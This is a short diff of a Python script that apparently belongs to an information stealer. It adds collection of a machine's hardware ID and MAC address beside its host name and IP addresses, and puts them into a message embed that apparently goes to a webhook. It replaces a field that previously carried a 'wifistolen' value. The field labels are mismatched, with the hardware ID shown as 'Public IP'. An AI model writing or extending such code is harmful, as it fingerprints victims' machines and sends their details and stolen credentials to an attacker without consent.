@@ -3,7 +3,9 @@ import requests
 import time
 import socket
 import subprocess
-
+import uuid
+hwid = uuid.getnode()
+mac_address = ':'.join(['{:02x}'.format((hwid >> i) & 0xff) for i in range(0, 48, 8)])
 computer_name = socket.gethostname()
 private_ip = socket.gethostbyname(socket.gethostname())
 public_ip = socket.gethostbyname(socket.getfqdn())
@@ -37,8 +39,8 @@ embed = {
             "inline": False
         },
         {
-            "name": "footer2",
-            "value": wifistolen,
+            "name": "Device Details",
+            "value": f"Public IP: {hwid}\nPrivate IP: {mac_address}",
             "inline": True
         }
     ],
